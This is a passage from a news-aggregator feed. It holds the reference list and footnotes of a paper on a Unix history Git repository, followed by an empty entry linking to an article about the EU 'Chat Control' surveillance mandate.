Foreword," The Bell System Technical Journal, vol. 57, no. 6, pp. 1899-1904, July-August 1978. &lt;/item&gt;&lt;item rend="dt-2"&gt;[2]&lt;/item&gt;&lt;item rend="dd-2"&gt; D. M. Ritchie and K. Thompson, "The UNIX time-sharing system," Bell System Technical Journal, vol. 57, no. 6, pp. 1905-1929, July-August 1978. &lt;/item&gt;&lt;item rend="dt-3"&gt;[3]&lt;/item&gt;&lt;item rend="dd-3"&gt; D. M. Ritchie, "The evolution of the UNIX time-sharing system," AT&amp;amp;T Bell Laboratories Technical Journal, vol. 63, no. 8, pp. 1577-1593, Oct. 1984. &lt;/item&gt;&lt;item rend="dt-4"&gt;[4]&lt;/item&gt;&lt;item rend="dd-4"&gt; P. H. Salus, A Quarter Century of UNIX. Boston, MA: Addison-Wesley, 1994. &lt;/item&gt;&lt;item rend="dt-5"&gt;[5]&lt;/item&gt;&lt;item rend="dd-5"&gt; E. S. Raymond, The Art of Unix Programming. Addison-Wesley, 2003. &lt;/item&gt;&lt;item rend="dt-6"&gt;[6]&lt;/item&gt;&lt;item rend="dd-6"&gt; M. J. Rochkind, "The source code control system," IEEE Transactions on Software Engineering, vol. SE-1, no. 4, pp. 255-265, 1975.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h3"&gt;Footnotes:&lt;/head&gt; 1https://github.com/dspinellis/unix-history-repo 2&lt;p&gt;Updates may add or modify material. To ensure replicability the repository's users are encouraged to fork it or archive it. &lt;/p&gt; 3http://www.tuhs.org/archive_sites.html 4https://www.mckusick.com/csrg/ 5http://www.oldlinux.org/Linux.old/distributions/386BSD 6http://ftp-archive.freebsd.org/pub/FreeBSD-Archive/old-releases/ 7https://github.com/freebsd/freebsd 8http://ftp.netbsd.org/pub/NetBSD/NetBSD-current/src/share/misc/bsd-family-tree 9https://github.com/dspinellis/unix-history-make &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.spinellis.gr/pubs/conf/2015-MSR-Unix-History/html/Spi15c.html"/><published>2025-11-28T09:32:38+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46077393</id><title>EU Council Approves New "Chat Control" Mandate Pushing Mass Surveillance</title><updated>2025-11-28T11:33:49.329912+00:00</updated><content/><link href="https://reclaimthenet.org/eu-council-approves-new-chat-control-mandate-pushing-mass-surveillance"/><published>2025-11-28T10:36:08+00:00</published></entry></feed>